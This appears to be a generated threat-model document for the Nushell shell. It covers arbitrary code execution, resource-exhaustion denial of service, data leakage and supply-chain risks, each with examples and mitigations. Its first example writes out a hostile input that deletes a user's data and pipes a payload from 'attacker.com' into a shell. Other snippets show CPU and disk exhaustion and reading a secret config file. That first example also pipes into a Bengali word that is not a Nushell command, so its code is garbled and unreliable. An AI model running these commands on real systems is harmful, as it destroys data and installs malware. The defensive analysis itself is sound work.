# Attack Surface Analysis for nushell/nushell

## Attack Surface: [Arbitrary Code Execution (ACE) via Untrusted Scripts](./attack_surfaces/arbitrary_code_execution__ace__via_untrusted_scripts.md)

*   **Description:**  Execution of malicious Nushell code provided by an attacker, leading to complete system compromise.
    *   **How Nushell Contributes:** Nushell's core functionality is to execute commands and scripts.  Its powerful features (file manipulation, network access, process control) make it a potent tool for attackers if they can inject their own code.
    *   **Example:**
        ```nushell
        # User-provided input (unsanitized):
        let user_input = "rm -rf /home/user/sensitive_data; curl http://attacker.com/malware | sh"

        # Application executes the input:
        $user_input | শেল
        ```
    *   **Impact:** Complete system compromise, data exfiltration, data destruction, malware installation, denial of service.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   **Strict Input Validation (Whitelist):**  Implement a *whitelist* approach, allowing only a very specific, pre-approved set of Nushell commands and arguments.  Reject *everything* else.  Do *not* use a blacklist.  Create a custom parser/validator if necessary.
        *   **Sandboxing (Multi-Layered):**
            *   **Containers:** Run Nushell within a container (e.g., Docker) with minimal privileges and restricted access to the host system (read-only mounts where possible).
            *   **Operating System-Level Sandboxing:** Use AppArmor, SELinux, or seccomp to further restrict the capabilities of the Nushell process *within* the container.
            *   **Virtual Machines (Highest Isolation):**  For maximum security, run Nushell in a dedicated VM.
        *   **Principle of Least Privilege:** The application process itself should run with the absolute minimum necessary permissions.  Never run as root.
        *   **Code Review:** Thoroughly review all code that interacts with Nushell, especially code that handles user input.
        *   **Regular Updates:** Keep Nushell and all dependencies up-to-date.

## Attack Surface: [Denial of Service (DoS) via Resource Exhaustion](./attack_surfaces/denial_of_service__dos__via_resource_exhaustion.md)

*   **Description:**  A malicious Nushell script consumes excessive system resources (CPU, memory, disk, network), rendering the application or host system unusable.
    *   **How Nushell Contributes:** Nushell's ability to execute commands and manipulate system resources makes it possible to craft scripts that intentionally or unintentionally cause resource exhaustion.
    *   **Example:**
        ```nushell
        # Infinite loop consuming CPU:
        loop { echo "looping..." }

        # Create a large file:
        'A' * 1000000000 | save large_file.txt
        ```
    *   **Impact:** Application unavailability, system instability, potential data loss (if disk space is exhausted).
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Resource Limits (ulimit):**  Set strict resource limits on the Nushell process using `ulimit` (Linux) or equivalent mechanisms.  Limit CPU time, memory, file size, number of processes, etc.
        *   **Timeouts:**  Implement timeouts for Nushell script execution.  Terminate scripts that run longer than a predefined limit.
        *   **Monitoring:**  Monitor resource usage of the Nushell process and alert on anomalies.

## Attack Surface: [Data Leakage/Manipulation via Privileged Access](./attack_surfaces/data_leakagemanipulation_via_privileged_access.md)

*   **Description:**  A compromised Nushell instance gains access to sensitive data (files, environment variables, databases) that it shouldn't have access to, leading to data breaches or unauthorized modifications.
    *   **How Nushell Contributes:** If Nushell is granted access to sensitive data (e.g., through file system permissions or environment variables), a malicious script can read, modify, or exfiltrate that data.
    *   **Example:**
        ```nushell
        # Read a sensitive configuration file:
        open /etc/my_app/secret_config.toml

        # Modify an environment variable:
        $env.DATABASE_PASSWORD = "new_password"
        ```
    *   **Impact:** Data breach, data corruption, unauthorized access to sensitive systems.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Principle of Least Privilege:**  Ensure Nushell has *only* the minimum necessary access to data and resources.  Restrict file system permissions, environment variables, etc.
        *   **Data Encryption:** Encrypt sensitive data at rest and in transit.
        *   **Input Sanitization:** Sanitize any data passed to Nushell to prevent injection attacks that might try to access unauthorized resources.
        *   **Avoid Sensitive Data in Environment:** Minimize the use of environment variables for storing sensitive information.

## Attack Surface: [Supply Chain Attacks](./attack_surfaces/supply_chain_attacks.md)

* **Description:** Compromise of the Nushell distribution or build process, leading to the installation of a malicious version of Nushell.
    * **How Nushell Contributes:** This is a general risk for any software, but it's particularly relevant for tools like Nushell that have powerful system access.
    * **Example:** An attacker compromises the Nushell GitHub repository or a package manager repository and replaces the legitimate Nushell binary with a backdoored version.
    * **Impact:** Complete system compromise, as the attacker-controlled Nushell instance can execute arbitrary code.
    * **Risk Severity:** Critical
    * **Mitigation Strategies:**
        * **Verify Downloads:** Always verify the integrity of downloaded Nushell binaries using checksums (e.g., SHA-256) or digital signatures provided by the official Nushell project.
        * **Use Trusted Sources:** Download Nushell only from the official GitHub repository or a trusted, well-maintained package manager.
        * **Software Composition Analysis (SCA):** Use SCA tools to track Nushell's dependencies and their known vulnerabilities. This helps identify potential supply chain risks.
